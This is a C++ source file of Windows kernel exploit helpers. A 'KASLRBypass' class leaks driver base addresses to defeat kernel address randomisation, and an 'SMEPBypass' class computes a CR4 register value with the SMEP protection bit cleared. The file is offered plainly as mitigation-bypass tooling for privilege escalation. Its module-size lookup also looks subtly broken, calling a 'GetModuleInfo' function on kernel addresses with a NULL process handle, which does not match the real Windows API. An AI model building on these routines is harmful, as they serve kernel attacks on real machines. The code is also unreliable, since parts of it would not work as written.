#include "mitigations.hpp"
#include <algorithm>

namespace MitigationBypass {

    uintptr_t KASLRBypass::find_kernel_base(const std::string& moduleName) {
        std::vector<KernelModuleInfo> modules = enumerate_kernel_modules();
        for (const auto& mod : modules) {
            if (mod.name == moduleName) {
                return mod.baseAddress;
            }
        }
        return 0;
    }

    std::vector<KernelModuleInfo> KASLRBypass::enumerate_kernel_modules() {
        std::vector<KernelModuleInfo> modules;
        HMODULE hMods[1024];
        DWORD cbNeeded;

        if (EnumDeviceDrivers(hMods, sizeof(hMods), &cbNeeded)) {
            DWORD count = cbNeeded / sizeof(HMODULE);
            for (DWORD i = 0; i < count; i++) {
                char szModName[MAX_PATH];
                if (GetDeviceDriverBaseName(hMods[i], szModName, sizeof(szModName))) {
                    MODULEINFO mi;
                    if (GetModuleInfo(hMods[i], NULL, &mi, sizeof(mi))) {
                        modules.push_back({szModName, (uintptr_t)hMods[i], mi.SizeOfImage});
                    }
                }
            }
        }
        return modules;
    }

    bool SMEPBypass::check_smep_status(uintptr_t cr4_value) {
        // SMEP is the 20th bit of CR4
        return (cr4_value & (1 << 20)) != 0;
    }

    uintptr_t SMEPBypass::get_smep_disabled_cr4(uintptr_t current_cr4) {
        // Bitwise AND with the inverse of the SMEP bit to ensure it is 0
        return current_cr4 & ~(1 << 20);
    }
}
